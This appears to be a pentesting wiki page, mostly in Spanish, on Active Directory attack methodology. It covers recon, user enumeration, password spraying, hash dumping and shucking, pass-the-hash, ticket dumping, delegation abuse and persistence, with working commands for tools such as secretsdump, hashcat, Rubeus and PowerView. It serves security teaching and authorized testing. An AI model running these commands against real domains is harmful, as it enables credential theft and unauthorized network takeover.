# Active Directory Metodología

{{#include ../../banners/hacktricks-training.md}}

## Resumen básico

**Active Directory** sirve como una tecnología fundamental, permitiendo a los **administradores de red** crear y gestionar de forma eficiente **dominios**, **usuarios** y **objetos** dentro de una red. Está diseñado para escalar, facilitando la organización de un gran número de usuarios en **grupos** y **subgrupos** manejables, mientras controla los **derechos de acceso** en varios niveles.

La estructura de **Active Directory** está compuesta por tres capas principales: **dominios**, **árboles** y **bosques**. Un **dominio** engloba una colección de objetos, como **usuarios** o **dispositivos**, que comparten una base de datos común. Los **árboles** son grupos de estos dominios vinculados por una estructura compartida, y un **bosque** representa la colección de varios árboles, interconectados mediante **relaciones de confianza**, formando la capa superior de la estructura organizativa. Se pueden designar **derechos de acceso** y **comunicación** específicos en cada uno de estos niveles.

Conceptos clave dentro de **Active Directory** incluyen:

1. **Directorio** – Aloja toda la información relativa a los objetos de Active Directory.
2. **Objeto** – Denota entidades dentro del directorio, incluyendo **usuarios**, **grupos** o **carpetas compartidas**.
3. **Dominio** – Sirve como contenedor para objetos del directorio, con la capacidad de que múltiples dominios coexistan dentro de un **bosque**, cada uno manteniendo su propia colección de objetos.
4. **Árbol** – Un agrupamiento de dominios que comparten un dominio raíz común.
5. **Bosque** – La cúspide de la estructura organizativa en Active Directory, compuesto por varios árboles con **relaciones de confianza** entre ellos.

**Active Directory Domain Services (AD DS)** abarca una serie de servicios críticos para la gestión centralizada y la comunicación dentro de una red. Estos servicios comprenden:

1. **Domain Services** – Centraliza el almacenamiento de datos y gestiona las interacciones entre **usuarios** y **dominios**, incluyendo funcionalidades de **autenticación** y **búsqueda**.
2. **Certificate Services** – Supervisa la creación, distribución y gestión de **certificados digitales** seguros.
3. **Lightweight Directory Services** – Soporta aplicaciones habilitadas para directorio a través del **protocolo LDAP**.
4. **Directory Federation Services** – Provee capacidades de **single-sign-on** para autenticar usuarios en múltiples aplicaciones web en una sola sesión.
5. **Rights Management** – Ayuda a proteger material con derechos de autor regulando su distribución y uso no autorizado.
6. **DNS Service** – Crucial para la resolución de **nombres de dominio**.

For a more detailed explanation check: [**TechTerms - Active Directory Definition**](https://techterms.com/definition/active_directory)

### **Kerberos Authentication**

To learn how to **attack an AD** you need to **understand** really good the **Kerberos authentication process**.\
[**Read this page if you still don't know how it works.**](kerberos-authentication.md)

## Hoja de referencia

Puedes consultar [https://wadcoms.github.io/](https://wadcoms.github.io) para tener una vista rápida de qué comandos puedes ejecutar para enumerar/explotar un AD.

> [!WARNING]
> Kerberos communication **requires a full qualifid name (FQDN)** for performing actions. If you try to access a machine by the IP address, **it'll use NTLM and not kerberos**.

## Recon de Active Directory (Sin credenciales/sesiones)

Si solo tienes acceso a un entorno AD pero no tienes credenciales/sesiones podrías:

- **Pentest la red:**
- Escanea la red, encuentra máquinas y puertos abiertos e intenta **explotar vulnerabilidades** o **extraer credenciales** de ellas (por ejemplo, [las impresoras pueden ser objetivos muy interesantes](ad-information-in-printers.md)).
- Enumerar DNS puede dar información sobre servidores clave en el dominio como web, impresoras, shares, vpn, media, etc.
- `gobuster dns -d domain.local -t 25 -w /opt/Seclist/Discovery/DNS/subdomain-top2000.txt`
- Consulta la guía general [**Pentesting Methodology**](../../generic-methodologies-and-resources/pentesting-methodology.md) para encontrar más información sobre cómo hacer esto.
- **Comprueba acceso null y Guest en servicios smb** (esto no funcionará en versiones modernas de Windows):
- `enum4linux -a -u "" -p "" <DC IP> && enum4linux -a -u "guest" -p "" <DC IP>`
- `smbmap -u "" -p "" -P 445 -H <DC IP> && smbmap -u "guest" -p "" -P 445 -H <DC IP>`
- `smbclient -U '%' -L //<DC IP> && smbclient -U 'guest%' -L //`
- Una guía más detallada sobre cómo enumerar un servidor SMB puede encontrarse aquí:


{{#ref}}
../../network-services-pentesting/pentesting-smb/
{{#endref}}

- **Enumera Ldap**
- `nmap -n -sV --script "ldap* and not brute" -p 389 <DC IP>`
- Una guía más detallada sobre cómo enumerar LDAP puede encontrarse aquí (presta **especial atención al acceso anónimo**):


{{#ref}}
../../network-services-pentesting/pentesting-ldap.md
{{#endref}}

- **Envenena la red**
- Recolecta credenciales **suplantando servicios con Responder** (impersonating services with Responder) (../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)
- Accede a hosts **abusando del relay attack** (../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack)
- Recolecta credenciales **exponiendo** **servicios UPnP falsos con evil-S** (../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md)[**SDP**](https://medium.com/@nickvangilder/exploiting-multifunction-printers-during-a-penetration-test-engagement-28d3840d8856)
- [**OSINT**](https://book.hacktricks.wiki/en/generic-methodologies-and-resources/external-recon-methodology/index.html):
- Extrae nombres de usuario/nombres a partir de documentos internos, redes sociales, servicios (principalmente web) dentro de los entornos del dominio y también desde lo disponible públicamente.
- Si encuentras los nombres completos de los empleados de la empresa, podrías probar diferentes convenciones de nombre de usuario de AD (**read this**). Las convenciones más comunes son: _NameSurname_, _Name.Surname_, _NamSur_ (3 letras de cada), _Nam.Sur_, _NSurname_, _N.Surname_, _SurnameName_, _Surname.Name_, _SurnameN_, _Surname.N_, 3 _random letters and 3 random numbers_ (abc123).
- Herramientas:
- [w0Tx/generate-ad-username](https://github.com/w0Tx/generate-ad-username)
- [urbanadventurer/username-anarchy](https://github.com/urbanadventurer/username-anarchy)

### Enumeración de usuarios

- **Anonymous SMB/LDAP enum:** Consulta las páginas de [**pentesting SMB**](../../network-services-pentesting/pentesting-smb/index.html) y [**pentesting LDAP**](../../network-services-pentesting/pentesting-ldap.md).
- **Kerbrute enum**: Cuando se solicita un **nombre de usuario inválido** el servidor responderá usando el código de error de **Kerberos** _KRB5KDC_ERR_C_PRINCIPAL_UNKNOWN_, lo que nos permite determinar que el nombre de usuario era inválido. Los **nombres de usuario válidos** provocarán bien el **TGT en un AS-REP** o el error _KRB5KDC_ERR_PREAUTH_REQUIRED_, indicando que el usuario requiere realizar pre-autenticación.
- **No Authentication against MS-NRPC**: Usando auth-level = 1 (No authentication) contra la interfaz MS-NRPC (Netlogon) en controladores de dominio. El método llama a la función `DsrGetDcNameEx2` después de enlazar la interfaz MS-NRPC para comprobar si el usuario o equipo existe sin credenciales. La herramienta [NauthNRPC](https://github.com/sud0Ru/NauthNRPC) implementa este tipo de enumeración. La investigación puede encontrarse [aquí](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/05/22190247/A-journey-into-forgotten-Null-Session-and-MS-RPC-interfaces.pdf)
```bash
./kerbrute_linux_amd64 userenum -d lab.ropnop.com --dc 10.10.10.10 usernames.txt #From https://github.com/ropnop/kerbrute/releases

nmap -p 88 --script=krb5-enum-users --script-args="krb5-enum-users.realm='DOMAIN'" <IP>
Nmap -p 88 --script=krb5-enum-users --script-args krb5-enum-users.realm='<domain>',userdb=/root/Desktop/usernames.txt <IP>

msf> use auxiliary/gather/kerberos_enumusers

crackmapexec smb dominio.es  -u '' -p '' --users | awk '{print $4}' | uniq
python3 nauth.py -t target -u users_file.txt #From https://github.com/sud0Ru/NauthNRPC
```
- **Servidor OWA (Outlook Web Access)**

Si encuentras uno de estos servidores en la red, también puedes realizar **user enumeration against it**. Por ejemplo, podrías usar la herramienta [**MailSniper**](https://github.com/dafthack/MailSniper):
```bash
ipmo C:\Tools\MailSniper\MailSniper.ps1
# Get info about the domain
Invoke-DomainHarvestOWA -ExchHostname [ip]
# Enumerate valid users from a list of potential usernames
Invoke-UsernameHarvestOWA -ExchHostname [ip] -Domain [domain] -UserList .\possible-usernames.txt -OutFile valid.txt
# Password spraying
Invoke-PasswordSprayOWA -ExchHostname [ip] -UserList .\valid.txt -Password Summer2021
# Get addresses list from the compromised mail
Get-GlobalAddressList -ExchHostname [ip] -UserName [domain]\[username] -Password Summer2021 -OutFile gal.txt
```
> [!WARNING]
> You can find lists of usernames in [**this github repo**](https://github.com/danielmiessler/SecLists/tree/master/Usernames/Names)  and this one ([**statistically-likely-usernames**](https://github.com/insidetrust/statistically-likely-usernames)).
>
> However, you should have the **name of the people working on the company** from the recon step you should have performed before this. With the name and surname you could used the script [**namemash.py**](https://gist.github.com/superkojiman/11076951) to generate potential valid usernames.

### Knowing one or several usernames

Ok, so you know you have already a valid username but no passwords... Then try:

- [**ASREPRoast**](asreproast.md): Si un usuario **no tiene** el atributo _DONT_REQ_PREAUTH_ puedes **request a AS_REP message** para ese usuario que contendrá algunos datos cifrados por una derivación de la contraseña del usuario.
- [**Password Spraying**](password-spraying.md): Probemos las **contraseñas más comunes** con cada uno de los usuarios descubiertos; quizá algún usuario esté usando una mala contraseña (¡ten en cuenta la política de contraseñas!).
- Nota que también puedes **spray OWA servers** para intentar acceder a los servidores de correo de los usuarios.


{{#ref}}
password-spraying.md
{{#endref}}

### LLMNR/NBT-NS Poisoning

Podrías ser capaz de **obtain** algunos challenge **hashes** para crackear mediante **poisoning** algunos protocolos de la **red**:


{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

### NTLM Relay

Si has logrado enumerar el active directory tendrás **más emails y una mejor comprensión de la network**. Podrías ser capaz de forzar NTLM [**relay attacks**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack) para obtener acceso al entorno AD.

### NetExec workspace-driven recon & relay posture checks

- Usa **`nxcdb` workspaces** para mantener el estado de recon del AD por engagement: `workspace create <name>` crea SQLite DBs por protocolo bajo `~/.nxc/workspaces/<name>` (smb/mssql/winrm/ldap/etc). Cambia vistas con `proto smb|mssql|winrm` y lista secretos recogidos con `creds`. Purga manualmente los datos sensibles cuando acabes: `rm -rf ~/.nxc/workspaces/<name>`.
- Descubrimiento rápido de subred con **`netexec smb <cidr>`** muestra el **dominio**, la **OS build**, los **SMB signing requirements**, y la **Null Auth**. Los miembros que muestran `(signing:False)` son **relay-prone**, mientras que los DCs suelen requerir signing.
- Genera **hostnames in /etc/hosts** directamente desde la salida de NetExec para facilitar el targeting:
```bash
netexec smb 10.2.10.0/24 --generate-hosts-file hosts
cat hosts /etc/hosts | sponge /etc/hosts
```
- Cuando **SMB relay to the DC is blocked** por signing, sigue probeando la postura de **LDAP**: `netexec ldap <dc>` highlights `(signing:None)` / weak channel binding. Un DC con SMB signing requerido pero LDAP signing deshabilitado sigue siendo un objetivo viable de **relay-to-LDAP** para abusos como **SPN-less RBCD**.

### Credenciales de impresora del lado del cliente leaks → validación masiva de credenciales de dominio

- Las UIs de impresora/web a veces **incrustan contraseñas de administrador enmascaradas en HTML**. Ver el source/devtools puede revelar texto claro (p. ej., `<input value="<password>">`), permitiendo acceso Basic-auth a repositorios de escaneo/impresión.
- Los print jobs recuperados pueden contener **documentos de incorporación en texto plano** con contraseñas por usuario. Mantén los emparejamientos alineados durante las pruebas:
```bash
cat IT_Procedures.txt | grep Username: | cut -d' ' -f2 > usernames
cat IT_Procedures.txt | grep Password: | cut -d' ' -f3 > passwords
netexec smb <dc> -u usernames -p passwords --no-bruteforce --continue-on-success
```
### Steal NTLM Creds

Si puedes **acceder a otros PCs o shares** con el **null o guest user** podrías **colocar archivos** (como un SCF file) que si de alguna forma son accedidos **dispararán una autenticación NTLM contra ti** para que puedas **robar** el **NTLM challenge** y crackearlo:

{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### Hash Shucking & NT-Candidate Attacks

**Hash shucking** trata cada NT hash que ya posees como una contraseña candidata para otros formatos más lentos cuyo material de clave se deriva directamente del NT hash. En lugar de brute-forcear frases de paso largas en tickets Kerberos RC4, desafíos NetNTLM o credenciales en caché, alimentas los NT hashes a los modos NT-candidate de Hashcat y dejas que valide la reutilización de contraseñas sin llegar a conocer el texto plano. Esto es especialmente potente tras una compromisión de dominio donde puedes recolectar miles de NT hashes actuales e históricos.

Usa shucking cuando:

- Tienes un corpus de NT desde DCSync, dumps SAM/SECURITY, o credential vaults y necesitas comprobar reutilización en otros dominios/forests.
- Capturas material Kerberos basado en RC4 (`$krb5tgs$23$`, `$krb5asrep$23$`), respuestas NetNTLM, o blobs DCC/DCC2.
- Quieres probar rápidamente la reutilización de frases de paso largas e incrackeables y pivotar inmediatamente vía Pass-the-Hash.

La técnica **no funciona** contra tipos de cifrado cuyas claves no son el NT hash (p. ej., Kerberos etype 17/18 AES). Si un dominio hace cumplir solo AES, debes volver a los modos regulares de contraseña.

#### Construcción de un corpus de NT hash

- **DCSync/NTDS** – Usa `secretsdump.py` con history para obtener el conjunto más grande posible de NT hashes (y sus valores anteriores):

```bash
secretsdump.py <domain>/<user>@<dc_ip> -just-dc-ntlm -history -user-status -outputfile smoke_dump
grep -i ':::' smoke_dump.ntds | awk -F: '{print $4}' | sort -u > nt_candidates.txt
```

Las entradas de history amplían dramáticamente el pool de candidatos porque Microsoft puede almacenar hasta 24 hashes previos por cuenta. Para más formas de recolectar secretos de NTDS ver:

{{#ref}}
dcsync.md
{{#endref}}

- **Endpoint cache dumps** – `nxc smb <ip> -u <local_admin> -p <password> --local-auth --lsa` (o Mimikatz `lsadump::sam /patch`) extrae datos locales SAM/SECURITY y logons de dominio en caché (DCC/DCC2). Desduplicar y añadir esos hashes a la misma lista `nt_candidates.txt`.
- **Rastrear metadata** – Mantén el username/domain que produjo cada hash (incluso si la wordlist contiene solo hex). Los hashes que coinciden te dicen inmediatamente qué principal está reutilizando una contraseña cuando Hashcat imprime el candidato ganador.
- Prefiere candidatos del mismo forest o de un forest de confianza; eso maximiza la probabilidad de solapamiento al shuckear.

#### Hashcat NT-candidate modes

| Hash Type                                | Password Mode | NT-Candidate Mode |
| ---------------------------------------- | ------------- | ----------------- |
| Domain Cached Credentials (DCC)          | 1100          | 31500             |
| Domain Cached Credentials 2 (DCC2)       | 2100          | 31600             |
| NetNTLMv1 / NetNTLMv1+ESS                | 5500          | 27000             |
| NetNTLMv2                                | 5600          | 27100             |
| Kerberos 5 etype 23 AS-REQ Pre-Auth      | 7500          | _N/A_             |
| Kerberos 5 etype 23 TGS-REP (Kerberoast) | 13100         | 35300             |
| Kerberos 5 etype 23 AS-REP               | 18200         | 35400             |

Notas:

- Las entradas NT-candidate **deben permanecer como NT hashes crudos de 32-hex**. Desactiva motores de reglas (no `-r`, no modos híbridos) porque el mangling corrompe el material clave candidato.
- Estos modos no son inherentemente más rápidos, pero el keyspace NTLM (~30,000 MH/s en un M3 Max) es ~100× más rápido que Kerberos RC4 (~300 MH/s). Probar una lista NT curada es mucho más barato que explorar todo el espacio de contraseñas en el formato lento.
- Siempre usa la **última build de Hashcat** (`git clone https://github.com/hashcat/hashcat && make install`) porque los modos 31500/31600/35300/35400 se incluyeron recientemente.
- Actualmente no hay un modo NT para AS-REQ Pre-Auth, y los etypes AES (19600/19700) requieren la contraseña en claro porque sus claves se derivan vía PBKDF2 desde contraseñas UTF-16LE, no desde NT hashes crudos.

#### Example – Kerberoast RC4 (mode 35300)

1. Captura un TGS RC4 para un SPN objetivo con un usuario de bajos privilegios (ver la página Kerberoast para detalles):

{{#ref}}
kerberoast.md
{{#endref}}

```bash
GetUserSPNs.py -dc-ip <dc_ip> -request <domain>/<user> -outputfile roastable_TGS
```

2. Shuckea el ticket con tu lista NT:

```bash
hashcat -m 35300 roastable_TGS nt_candidates.txt
```

Hashcat deriva la clave RC4 de cada candidato NT y valida el blob `$krb5tgs$23$...`. Una coincidencia confirma que la cuenta de servicio usa uno de tus NT hashes existentes.

3. Pivotar inmediatamente vía PtH:

```bash
nxc smb <dc_ip> -u roastable -H <matched_nt_hash>
```

Opcionalmente puedes recuperar el texto plano más tarde con `hashcat -m 1000 <matched_hash> wordlists/` si es necesario.

#### Example – Cached credentials (mode 31600)

1. Dump de logons en caché desde una workstation comprometida:

```bash
nxc smb <host_ip> -u localadmin -p '<password>' --local-auth --lsa > lsa_dump.txt
```

2. Copia la línea DCC2 para el usuario de dominio interesante en `dcc2_highpriv.txt` y shuckéala:

```bash
hashcat -m 31600 dcc2_highpriv.txt nt_candidates.txt
```

3. Una coincidencia exitosa devuelve el NT hash ya conocido en tu lista, probando que el usuario en caché está reutilizando una contraseña. Úsalo directamente para PtH (`nxc smb <dc_ip> -u highpriv -H <hash>`) o crackéalo en modo NTLM rápido para recuperar la cadena.

El mismo flujo aplica a respuestas NetNTLM (`-m 27000/27100`) y DCC (`-m 31500`). Una vez identificada una coincidencia puedes lanzar relay, SMB/WMI/WinRM PtH, o volver a crackear el NT hash con masks/rules offline.

## Enumerating Active Directory WITH credentials/session

Para esta fase necesitas haber **comprometido las credenciales o una sesión de una cuenta de dominio válida.** Si tienes algunas credenciales válidas o un shell como usuario de dominio, **debes recordar que las opciones dadas antes siguen siendo opciones para comprometer a otros usuarios**.

Antes de empezar la enumeración autenticada deberías conocer cuál es el **Kerberos double hop problem.**

{{#ref}}
kerberos-double-hop-problem.md
{{#endref}}

### Enumeration

Haber comprometido una cuenta es un **gran paso para empezar a comprometer todo el dominio**, porque vas a poder iniciar la **enumeración de Active Directory:**

Respecto a [**ASREPRoast**](asreproast.md) ahora puedes encontrar todos los usuarios potencialmente vulnerables, y respecto a [**Password Spraying**](password-spraying.md) puedes obtener una **lista de todos los usernames** e intentar la contraseña de la cuenta comprometida, contraseñas vacías y nuevas contraseñas prometedoras.

- You could use the [**CMD to perform a basic recon**](../basic-cmd-for-pentesters.md#domain-info)
- You can also use [**powershell for recon**](../basic-powershell-for-pentesters/index.html) which will be stealthier
- You can also use [**use powerview**](../basic-powershell-for-pentesters/powerview.md) to extract more detailed information
- Another amazing tool for recon in an active directory is [**BloodHound**](bloodhound.md). It is **not very stealthy** (depending on the collection methods you use), but **if you don't care** about that, you should totally give it a try. Find where users can RDP, find path to other groups, etc.
- **Other automated AD enumeration tools are:** [**AD Explorer**](bloodhound.md#ad-explorer)**,** [**ADRecon**](bloodhound.md#adrecon)**,** [**Group3r**](bloodhound.md#group3r)**,** [**PingCastle**](bloodhound.md#pingcastle)**.**
- [**DNS records of the AD**](ad-dns-records.md) as they might contain interesting information.
- A **tool with GUI** that you can use to enumerate the directory is **AdExplorer.exe** from **SysInternal** Suite.
- You can also search in the LDAP database with **ldapsearch** to look for credentials in fields _userPassword_ & _unixUserPassword_, or even for _Description_. cf. [Password in AD User comment on PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#password-in-ad-user-comment) for other methods.
- If you are using **Linux**, you could also enumerate the domain using [**pywerview**](https://github.com/the-useless-one/pywerview).
- You could also try automated tools as:
- [**tomcarver16/ADSearch**](https://github.com/tomcarver16/ADSearch)
- [**61106960/adPEAS**](https://github.com/61106960/adPEAS)
- **Extracting all domain users**

Es muy fácil obtener todos los usernames del dominio desde Windows (`net user /domain` ,`Get-DomainUser` o `wmic useraccount get name,sid`). En Linux, puedes usar: `GetADUsers.py -all -dc-ip 10.10.10.110 domain.com/username` o `enum4linux -a -u "user" -p "password" <DC IP>`

> Incluso si esta sección Enumeration parece pequeña esta es la parte más importante de todas. Accede a los enlaces (principalmente los de cmd, powershell, powerview y BloodHound), aprende cómo enumerar un dominio y practica hasta sentirte cómodo. Durante una evaluación, este será el momento clave para encontrar tu camino hacia DA o decidir que no se puede hacer nada.

### Kerberoast

Kerberoasting implica obtener **TGS tickets** usados por servicios ligados a cuentas de usuario y crackear su cifrado —que se basa en las contraseñas de usuario— **offline**.

Más sobre esto en:

{{#ref}}
kerberoast.md
{{#endref}}

### Remote connexion (RDP, SSH, FTP, Win-RM, etc)

Una vez que has obtenido algunas credenciales puedes comprobar si tienes acceso a alguna **máquina**. Para eso, podrías usar **CrackMapExec** para intentar conectar a varios servidores con diferentes protocolos, de acuerdo a tus escaneos de puertos.

### Local Privilege Escalation

Si has comprometido credenciales o una sesión como usuario de dominio normal y tienes **acceso** con este usuario a **cualquier máquina del dominio** deberías intentar encontrar la manera de **escalar privilegios localmente y saquear credenciales**. Esto se debe a que solo con privilegios de administrador local podrás **dumpear hashes de otros usuarios** en memoria (LSASS) y localmente (SAM).

Hay una página completa en este libro sobre [**local privilege escalation in Windows**](../windows-local-privilege-escalation/index.html) y una [**checklist**](../checklist-windows-privilege-escalation.md). Además, no olvides usar [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite).

### Current Session Tickets

Es muy **improbable** que encuentres **tickets** en el usuario actual que **te den permiso para acceder** a recursos inesperados, pero podrías comprobar:
```bash
## List all tickets (if not admin, only current user tickets)
.\Rubeus.exe triage
## Dump the interesting one by luid
.\Rubeus.exe dump /service:krbtgt /luid:<luid> /nowrap
[IO.File]::WriteAllBytes("ticket.kirbi", [Convert]::FromBase64String("<BASE64_TICKET>"))
```
### NTLM Relay

Si has conseguido enumerar el Active Directory tendrás **más correos electrónicos y una mejor comprensión de la red**. Podrías ser capaz de forzar NTLM [**relay attacks**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack)**.**

### Looks for Creds in Computer Shares | SMB Shares

Ahora que tienes algunas credenciales básicas deberías comprobar si puedes **encontrar** archivos **interesantes compartidos dentro del AD**. Podrías hacerlo manualmente, pero es una tarea muy aburrida y repetitiva (y más aún si encuentras cientos de documentos que necesitas revisar).

[**Sigue este enlace para aprender sobre herramientas que podrías usar.**](../../network-services-pentesting/pentesting-smb/index.html#domain-shared-folders-search)

### Steal NTLM Creds

Si puedes **acceder a otros PCs o comparticiones** podrías **colocar archivos** (como un archivo SCF) que si de alguna forma son accedidos **dispararán una autenticación NTLM contra ti** para que puedas **robar** el **NTLM challenge** y crackearlo:


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### CVE-2021-1675/CVE-2021-34527 PrintNightmare

Esta vulnerabilidad permitía a cualquier usuario autenticado **comprometer el controlador de dominio**.


{{#ref}}
printnightmare.md
{{#endref}}

## Privilege escalation on Active Directory WITH privileged credentials/session

**Para las siguientes técnicas un usuario de dominio normal no es suficiente; necesitas privilegios/credenciales especiales para realizar estos ataques.**

### Hash extraction

Con suerte lograste **comprometer alguna cuenta de administrador local** usando [AsRepRoast](asreproast.md), [Password Spraying](password-spraying.md), [Kerberoast](kerberoast.md), [Responder](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md) incluyendo relaying, [EvilSSDP](../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md), [escalando privilegios localmente](../windows-local-privilege-escalation/index.html).\
Entonces, es momento de volcar todos los hashes en memoria y localmente.\
[**Lee esta página sobre las diferentes maneras de obtener los hashes.**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

### Pass the Hash

**Una vez que tienes el hash de un usuario**, puedes usarlo para **suplantarlo**.\
Necesitas usar alguna **herramienta** que **realice** la **autenticación NTLM usando** ese **hash**, **o** podrías crear un nuevo **sessionlogon** e **inyectar** ese **hash** dentro de **LSASS**, de modo que cuando se realice cualquier **autenticación NTLM**, se **use ese hash.** La última opción es lo que hace mimikatz.\
[**Lee esta página para más información.**](../ntlm/index.html#pass-the-hash)

### Over Pass the Hash/Pass the Key

Este ataque tiene como objetivo **usar el hash NTLM del usuario para solicitar tickets Kerberos**, como alternativa al común Pass The Hash sobre el protocolo NTLM. Por lo tanto, esto podría ser especialmente **útil en redes donde el protocolo NTLM está deshabilitado** y solo **Kerberos está permitido** como protocolo de autenticación.


{{#ref}}
over-pass-the-hash-pass-the-key.md
{{#endref}}

### Pass the Ticket

En el método de ataque **Pass The Ticket (PTT)**, los atacantes **roban el ticket de autenticación de un usuario** en lugar de su contraseña o valores hash. Ese ticket robado se utiliza para **suplantar al usuario**, obteniendo acceso no autorizado a recursos y servicios dentro de una red.


{{#ref}}
pass-the-ticket.md
{{#endref}}

### Credentials Reuse

Si tienes el **hash** o la **contraseña** de un **administrador local** deberías intentar **iniciar sesión localmente** en otros **PCs** con ella.
```bash
# Local Auth Spray (once you found some local admin pass or hash)
## --local-auth flag indicate to only try 1 time per machine
crackmapexec smb --local-auth 10.10.10.10/23 -u administrator -H 10298e182387f9cab376ecd08491764a0 | grep +
```
> [!WARNING]
> Ten en cuenta que esto es bastante **ruidoso** y **LAPS** lo **mitigaría**.

### MSSQL Abuse & Trusted Links

Si un usuario tiene privilegios para **acceder a instancias MSSQL**, podría usarlas para **ejecutar comandos** en el host MSSQL (si se está ejecutando como SA), **robar** el **hash** NetNTLM o incluso realizar un **relay** **attack**.\
Además, si una instancia MSSQL es confiable (database link) por otra instancia MSSQL diferente. Si el usuario tiene privilegios sobre la base de datos confiable, podrá **usar la relación de confianza para ejecutar consultas también en la otra instancia**. Estas confianzas pueden encadenarse y en algún punto el usuario podría encontrar una base de datos mal configurada donde puede ejecutar comandos.\
**Los enlaces entre bases de datos funcionan incluso a través de forest trusts.**


{{#ref}}
abusing-ad-mssql.md
{{#endref}}

### IT asset/deployment platforms abuse

Las suites de inventario y despliegue de terceros suelen exponer caminos potentes hacia credenciales y ejecución de código. Ver:

{{#ref}}
sccm-management-point-relay-sql-policy-secrets.md
{{#endref}}

{{#ref}}
lansweeper-security.md
{{#endref}}

### Unconstrained Delegation

Si encuentras cualquier objeto Computer con el atributo [ADS_UF_TRUSTED_FOR_DELEGATION](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>) y tienes privilegios de dominio en el equipo, podrás volcar TGTs desde la memoria de todos los usuarios que inicien sesión en el equipo.\
Así que, si un **Domain Admin inicia sesión en el equipo**, podrás volcar su TGT e impersonarlo usando [Pass the Ticket](pass-the-ticket.md).\
Gracias a constrained delegation podrías incluso **comprometer automáticamente un Print Server** (ojalá sea un DC).


{{#ref}}
unconstrained-delegation.md
{{#endref}}

### Constrained Delegation

Si a un usuario o equipo se le permite "Constrained Delegation" podrá **impersonar a cualquier usuario para acceder a algunos servicios en un equipo**.\
Entonces, si **comprometes el hash** de este usuario/equipo podrás **impersonar a cualquier usuario** (incluso domain admins) para acceder a ciertos servicios.


{{#ref}}
constrained-delegation.md
{{#endref}}

### Resourced-based Constrain Delegation

Tener privilegio de **WRITE** sobre un objeto de Active Directory de un equipo remoto permite obtener ejecución de código con **privilegios elevados**:


{{#ref}}
resource-based-constrained-delegation.md
{{#endref}}

### Permissions/ACLs Abuse

El usuario comprometido podría tener algunos **privilegios interesantes sobre ciertos objetos de dominio** que podrían permitirte **moverte** lateralmente/**escalar** privilegios.

{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Printer Spooler service abuse

Descubrir un **servicio Spool escuchando** dentro del dominio puede ser **abusado** para **adquirir nuevas credenciales** y **escalar privilegios**.


{{#ref}}
printers-spooler-service-abuse.md
{{#endref}}

### Third party sessions abuse

Si **otros usuarios** **acceden** a la máquina **comprometida**, es posible **recabar credenciales desde la memoria** e incluso **inyectar beacons en sus procesos** para impersonarlos.\
Usualmente los usuarios accederán al sistema vía RDP, así que aquí tienes cómo realizar un par de ataques sobre sesiones RDP de terceros:


{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### LAPS

**LAPS** proporciona un sistema para gestionar la **contraseña del Administrador local** en equipos unidos al dominio, asegurando que esté **aleatorizada**, sea única y se **cambie** con frecuencia. Estas contraseñas se almacenan en Active Directory y el acceso está controlado mediante ACLs sólo a usuarios autorizados. Con permisos suficientes para acceder a estas contraseñas, es posible pivotar a otros equipos.


{{#ref}}
laps.md
{{#endref}}

### Certificate Theft

**Recopilar certificados** desde la máquina comprometida podría ser una forma de escalar privilegios dentro del entorno:


{{#ref}}
ad-certificates/certificate-theft.md
{{#endref}}

### Certificate Templates Abuse

Si se configuran **plantillas vulnerables** es posible abusar de ellas para escalar privilegios:


{{#ref}}
ad-certificates/domain-escalation.md
{{#endref}}

## Post-exploitation with high privilege account

### Dumping Domain Credentials

Una vez que obtienes privilegios de **Domain Admin** o, aún mejor, **Enterprise Admin**, puedes **volcar** la **base de datos del dominio**: _ntds.dit_.

[**More information about DCSync attack can be found here**](dcsync.md).

[**More information about how to steal the NTDS.dit can be found here**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

### Privesc as Persistence

Algunas de las técnicas discutidas antes pueden usarse para persistencia.\
Por ejemplo, podrías:

- Hacer que usuarios sean vulnerables a [**Kerberoast**](kerberoast.md)

```bash
Set-DomainObject -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}r
```

- Hacer que usuarios sean vulnerables a [**ASREPRoast**](asreproast.md)

```bash
Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
```

- Conceder privilegios de [**DCSync**](#dcsync) a un usuario

```bash
Add-DomainObjectAcl -TargetIdentity "DC=SUB,DC=DOMAIN,DC=LOCAL" -PrincipalIdentity bfarmer -Rights DCSync
```

### Silver Ticket

El **Silver Ticket attack** crea un **legítimo Ticket Granting Service (TGS) ticket** para un servicio específico usando el **NTLM hash** (por ejemplo, el **hash de la cuenta del PC**). Este método se emplea para **acceder a los privilegios del servicio**.


{{#ref}}
silver-ticket.md
{{#endref}}

### Golden Ticket

Un **Golden Ticket attack** implica que un atacante obtiene acceso al **hash NTLM de la cuenta krbtgt** en un entorno Active Directory (AD). Esta cuenta es especial porque se usa para firmar todos los **Ticket Granting Tickets (TGTs)**, esenciales para la autenticación dentro de la red AD.

Una vez que el atacante obtiene este hash, puede crear **TGTs** para cualquier cuenta que elija (Silver ticket attack).


{{#ref}}
golden-ticket.md
